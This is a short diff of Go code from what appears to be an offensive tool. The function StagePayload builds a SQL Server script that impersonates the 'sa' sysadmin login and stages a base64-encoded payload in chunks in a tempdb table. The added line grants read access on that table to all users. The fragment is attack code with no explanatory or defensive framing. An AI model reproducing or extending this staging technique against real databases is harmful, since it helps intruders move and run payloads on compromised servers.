@@ -54,6 +54,7 @@ func StagePayload(payloadPath, outPath string, encrypt bool) (key string, err er
 	sb.WriteString("EXECUTE AS LOGIN='sa';\n")
 	sb.WriteString("IF OBJECT_ID('tempdb..stg','U') IS NOT NULL DROP TABLE tempdb..stg;\n")
 	sb.WriteString("CREATE TABLE tempdb..stg (id INT IDENTITY(1,1), chunk NVARCHAR(MAX));\n")
+	sb.WriteString("GRANT SELECT ON tempdb..stg TO PUBLIC;\n")
 	for i := 0; i < len(b64); i += chunkSize {
 		end := i + chunkSize
 		if end > len(b64) {
